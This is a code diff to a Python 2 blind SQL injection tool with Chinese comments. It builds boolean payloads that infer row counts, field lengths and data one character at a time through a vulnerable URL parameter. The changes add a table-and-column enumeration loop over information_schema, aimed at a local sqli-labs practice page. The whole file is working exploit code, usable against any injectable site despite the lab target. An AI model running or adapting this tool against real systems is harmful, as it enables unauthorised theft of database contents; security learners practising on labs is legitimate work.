@@ -80,7 +80,10 @@ class Blind():
         hdrs =  result.headers
         if 'Content-Encoding' in hdrs and hdrs['Content-Encoding'] == 'gzip':
             data = zlib.decompress(result,16+zlib.MAX_WBITS)
+        #test:查看具体的payload
         #print req.__dict__
+        #print '=================================================================>'
+        #print '[+]payload:',req._Request__original
         result = self.request_successful(data)
         time.sleep(self.timeout)
         return result
@@ -90,17 +93,20 @@ class Blind():
 
     #依据对应sql语句需修改payload
     def count_params(self, operator, number, table):
+        '得到所要查的东西有多少库、表、列'
         params = dict(self.params)
         params[self.vulnerable_param] += '\' and {0} {1} (select count(*) from {2}) -- '.format(number,operator,table)
         return params
 
     def length_params(self, operator,number, field, table, offset):
+        '获得长度'
         params = dict(self.params)
         table = ' from ' + table if table is not None else ''
         params[self.vulnerable_param] += '\' and {0} {1} (select length({2}) {3} limit 1 offset {4}) -- '.format(number, operator, field, table, offset)
         return params
 
     def data_params(self, number, field, str_index, table, offset):
+        '获得数据'
         params = dict(self.params)
         table = ' from ' + table if table is not None else ''
         params[self.vulnerable_param] += '\' and {0} < (select ascii(substring({1}, {2}, 1)) {3} limit 1 offset {4} )-- '.format(number, field, str_index, table, offset)
@@ -143,6 +149,9 @@ class Blind():
         last = 1
         while True:
             self.echo_trying('length',last)
+            #这里加个异常处理
+            if last > 0xFF:
+                raise Exception('Are you sure the length you want to query longer that 0xFF ? Perhaps,you should check you input! ')
             params =  self.length_params('>',last,field,table,index)
             if self.make_request(params):
                 break
@@ -223,7 +232,12 @@ class Blind():
         return ' '.join(where_cond)
 
     #fields 表示要注入得到的数据
-    def query(self, fields, table, where='', start=0):
+    def query(self, fields, table=None, where='', start=0):
+        #如果不加table，即select user() 这种情况
+        if table == None:
+            if ',' in fields:
+                fields = self.concat(fields)
+            return self.query_offset(fields)
         try:
             print '[+] Guessing number of rows...'
             if len(where) > 0:
@@ -231,18 +245,19 @@ class Blind():
                 table = table + ' where ' + where
             if ',' in fields:
                 fields = self.concat(fields)
+                print fields
             count = self.guess_count(table)
             print '\r[+] Rows: ' + str(count) + '         '
             results = []
             for i in range(start, count):
                 print '[i] Dumping record ' + str(i+1) + '/' + str(count)
                 results.append(self.query_offset(fields, table, i))
-            print '[+] Query results:'
+            print '[+] Query results :'
             for i in results:
                 print ' -> ' + i
             return results
         except KeyboardInterrupt:
-            print ''
+            print 'stopped!'
 
     def proof_of_concept(self):
         if self.dbms == 'mysql':
@@ -270,5 +285,9 @@ if __name__ == "__main__":
     test = Blind('http://localhost:8888/sqli-labs/less-8/?id=1','You are in...........')
     username,database,version=test.proof_of_concept()
     print 'Get table'
-    where = 'table_schema=\''+database+'\''
-    table = test.query('table_name','information_schema.tables',where)
+    table_where = 'table_schema = \''+database+'\''#系统会自动转换,不过需要空格分开，才能触发
+    tables = test.query('table_name','information_schema.tables',table_where)
+    for i in tables:
+        column_where = table_where+' and table_name= \''+i+'\''
+        columns =  test.query('column_name','information_schema.columns',column_where)
+        print 'database -> ',database,'\rtable -> ',i,'\rcolumns: -> ',columns
